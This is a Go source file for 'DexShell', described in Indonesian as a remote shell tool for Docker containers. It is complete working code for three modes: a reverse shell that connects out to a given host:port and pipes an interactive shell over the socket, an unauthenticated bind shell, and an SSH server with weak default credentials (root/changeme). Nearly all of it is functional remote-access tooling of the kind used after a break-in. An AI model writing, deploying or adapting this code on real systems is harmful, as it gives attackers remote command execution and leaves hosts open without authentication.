// DexShell - Simple remote shell tool untuk Docker containers.
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"

	gossh "golang.org/x/crypto/ssh"
)

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "reverse":
		if len(os.Args) < 3 {
			fmt.Fprintf(os.Stderr, "Usage: dexshell reverse <host:port>\n")
			os.Exit(1)
		}
		if err := reverseShell(os.Args[2]); err != nil {
			fmt.Fprintf(os.Stderr, "reverse shell error: %v\n", err)
			os.Exit(1)
		}

	case "bind":
		if len(os.Args) < 3 {
			fmt.Fprintf(os.Stderr, "Usage: dexshell bind <port>\n")
			os.Exit(1)
		}
		if err := bindShell(os.Args[2]); err != nil {
			fmt.Fprintf(os.Stderr, "bind shell error: %v\n", err)
			os.Exit(1)
		}

	case "ssh":
		if err := sshServer(); err != nil {
			fmt.Fprintf(os.Stderr, "ssh server error: %v\n", err)
			os.Exit(1)
		}

	default:
		printUsage()
		os.Exit(1)
	}
}

func reverseShell(addr string) error {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("dial %s: %w", addr, err)
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "[*] connected to %s\n", addr)

	cmd := shellCommand()
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start shell: %w", err)
	}

	return cmd.Wait()
}

func bindShell(port string) error {
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		return fmt.Errorf("listen :%s: %w", port, err)
	}
	defer ln.Close()

	fmt.Fprintf(os.Stderr, "[*] bind shell listening on 0.0.0.0:%s\n", port)

	conn, err := ln.Accept()
	if err != nil {
		return fmt.Errorf("accept: %w", err)
	}
	defer conn.Close()

	fmt.Fprintf(os.Stderr, "[*] connection from %s\n", conn.RemoteAddr())

	cmd := shellCommand()
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("start shell: %w", err)
	}

	return cmd.Wait()
}

func sshServer() error {
	// Load configuration from environment
	password := getEnv("SSH_PASSWORD", "changeme")
	port := getEnv("SSH_PORT", "2222")
	user := getEnv("SSH_USER", "root")

	// Generate host key
	key, err := generateHostKey()
	if err != nil {
		return fmt.Errorf("generate host key: %w", err)
	}

	// Configure SSH server
	config := &gossh.ServerConfig{
		PasswordCallback: func(c gossh.ConnMetadata, pass []byte) (*gossh.Permissions, error) {
			if c.User() == user && string(pass) == password {
				return nil, nil
			}
			return nil, fmt.Errorf("authentication failed")
		},
	}
	config.AddHostKey(key)

	// Start listener
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		return fmt.Errorf("listen :%s: %w", port, err)
	}
	defer ln.Close()

	fmt.Fprintf(os.Stderr, "[*] SSH server listening on 0.0.0.0:%s\n", port)
	fmt.Fprintf(os.Stderr, "[*] User: %s\n", user)
	fmt.Fprintf(os.Stderr, "[*] Connect with: ssh -p %s %s@<host>\n", port, user)

	// Accept connections
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("accept error: %v", err)
			continue
		}
		go handleSSHConnection(conn, config)
	}
}

func handleSSHConnection(conn net.Conn, config *gossh.ServerConfig) {
	defer conn.Close()

	sshConn, chans, reqs, err := gossh.NewServerConn(conn, config)
	if err != nil {
		log.Printf("handshake error: %v", err)
		return
	}
	defer sshConn.Close()

	log.Printf("connection from %s as %s", sshConn.RemoteAddr(), sshConn.User())
	go gossh.DiscardRequests(reqs)

	// Handle channels
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(gossh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			log.Printf("accept channel error: %v", err)
			continue
		}

		go handleSSHSession(channel, requests)
	}
}

func handleSSHSession(channel gossh.Channel, requests <-chan *gossh.Request) {
	defer channel.Close()

	cmd := shellCommand()
	shellRequested := make(chan struct{})

	go func() {
		for req := range requests {
			switch req.Type {
			case "shell":
				if req.WantReply {
					req.Reply(true, nil)
				}
				close(shellRequested)
				return
			default:
				if req.WantReply {
					req.Reply(false, nil)
				}
			}
		}
	}()

	<-shellRequested

	cmd.Stdin = channel
	cmd.Stdout = channel
	cmd.Stderr = channel

	if err := cmd.Start(); err != nil {
		log.Printf("start shell error: %v", err)
		return
	}

	cmd.Wait()
}

func generateHostKey() (gossh.Signer, error) {
	// Generate RSA private key
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Encode to PEM format
	privateKeyPEM := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	}

	// Parse PEM block to get signer
	signer, err := gossh.ParsePrivateKey(pem.EncodeToMemory(privateKeyPEM))
	if err != nil {
		return nil, err
	}

	return signer, nil
}

func shellCommand() *exec.Cmd {
	for _, sh := range []string{"/bin/bash", "/bin/sh", "/bin/ash"} {
		if path, err := exec.LookPath(sh); err == nil {
			return exec.Command(path, "-i")
		}
	}
	return exec.Command("/bin/sh", "-i")
}

func getEnv(key, defaultVal string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultVal
}

func printUsage() {
	fmt.Fprintf(os.Stderr, `DexShell - Simple remote shell tool untuk Docker containers

Penggunaan:
  dexshell reverse <host:port>   Connect ke listener (reverse shell)
  dexshell bind    <port>        Listen untuk koneksi masuk (bind shell)
  dexshell ssh                   Jalankan SSH server (dengan config dari .env)

Environment variables (untuk SSH):
  SSH_PASSWORD    Password login (default: changeme)
  SSH_PORT        Port SSH (default: 2222)
  SSH_USER        Username login (default: root)

Contoh:
  dexshell reverse 10.0.0.5:4444
  dexshell bind 4444
  docker run -e SSH_PASSWORD=mypassword -p 2222:2222 dexshell ./dexshell ssh
`)
}
